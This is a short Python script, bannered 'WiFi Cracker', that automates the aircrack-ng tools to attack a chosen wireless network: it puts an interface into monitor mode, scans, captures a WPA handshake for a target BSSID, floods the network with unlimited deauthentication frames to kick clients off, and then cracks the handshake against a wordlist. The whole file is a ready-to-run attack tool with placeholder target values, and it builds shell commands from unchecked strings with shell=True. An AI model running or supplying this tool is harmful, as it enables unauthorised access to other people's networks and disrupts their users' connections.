import subprocess
import pyfiglet

def print_banner():
    banner = pyfiglet.figlet_format("WiFi Cracker")
    print(banner)
    print("Automated WiFi Cracking Tool")

def run_command(command):
    try:
        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = result.communicate()
        if result.returncode == 0:
            print(stdout)
        else:
            print("Error:\n", stderr)
    except Exception as e:
        print("An error occurred: {}".format(e))

def enable_monitor_mode(interface):
    print("Enabling monitor mode on {}...".format(interface))
    run_command("sudo airmon-ng start {}".format(interface))

def disable_monitor_mode(interface):
    print("Disabling monitor mode on {}...".format(interface))
    run_command("sudo airmon-ng stop {}".format(interface))

def scan_networks(interface):
    print("Scanning for networks...")
    run_command("sudo airodump-ng {}".format(interface))

def capture_handshake(interface, bssid, channel, output_file):
    print("Capturing handshake on {} for BSSID {} on channel {}...".format(interface, bssid, channel))
    run_command("sudo airodump-ng -c {} --bssid {} -w {} {}".format(channel, bssid, output_file, interface))

def deauthenticate_clients(interface, bssid):
    print("Deauthenticating clients on {} for BSSID {}...".format(interface, bssid))
    run_command("sudo aireplay-ng --deauth 0 -a {} {}".format(bssid, interface))

def crack_wpa_handshake(wordlist, capture_file):
    print("Cracking the WPA handshake...")
    run_command("aircrack-ng -w {} {}".format(wordlist, capture_file))

if __name__ == "__main__":
    print_banner()

    # Interface and file paths
    interface = "wlan0"  # Replace with your wireless interface
    bssid = "00:11:22:33:44:55"  # Replace with the target BSSID
    channel = 6  # Replace with the target channel
    output_file = "handshake"
    wordlist_path = "path/to/wordlist.txt"  # Replace with your wordlist path

    enable_monitor_mode(interface)
    
    try:
        scan_networks(interface)
        capture_handshake(interface, bssid, channel, output_file)
        deauthenticate_clients(interface, bssid)
        crack_wpa_handshake(wordlist_path, output_file + "-01.cap")
    finally:
        disable_monitor_mode(interface)
